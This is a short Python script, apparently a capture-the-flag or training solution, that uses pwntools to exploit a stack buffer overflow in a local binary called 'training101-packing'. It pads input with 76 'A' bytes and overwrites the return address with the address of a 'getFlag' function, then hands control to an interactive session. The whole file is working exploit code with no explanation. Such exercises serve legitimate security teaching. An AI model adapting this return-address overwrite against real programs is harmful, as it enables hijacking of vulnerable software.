#!/usr/bin/env python

from pwn import *

p = process('./training101-packing')

p.sendline('A'*76 + p32(p.elf.symbols["getFlag"]))

p.interactive()